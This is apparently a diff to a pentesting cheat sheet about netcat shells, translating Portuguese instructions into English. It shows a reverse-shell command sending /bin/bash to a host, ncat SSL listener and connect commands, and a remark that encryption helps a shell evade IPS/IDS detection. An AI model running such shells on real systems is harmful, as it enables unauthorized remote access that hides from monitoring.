@@ -55,8 +55,8 @@ Example Linux sending the shell: `nc -vn host port -e /bin/bash`
 Netcat has the ability to encrypt the data being passed through the shell, which makes it difficult for an IPS or an IDS to detect any threats
 
 
-Como criar a chave SSL: `openssl req -x509 -newkey rsa:2048 -keyout chave.pem -out cert.pem -days 10`
+How to create the SSL key: `openssl req -x509 -newkey rsa:2048 -keyout chave.pem -out cert.pem -days 10`
 
-Como fazer a comunicação: `ncat -vnlp <port> --ssl-key chave.pem --ssl-cert cert.pem`
+How to make the communication: `ncat -vnlp <port> --ssl-key chave.pem --ssl-cert cert.pem`
 
-Para se conectar: `ncat -vn <host> <port> --ssl`
+How to connct: `ncat -vn <host> <port> --ssl`
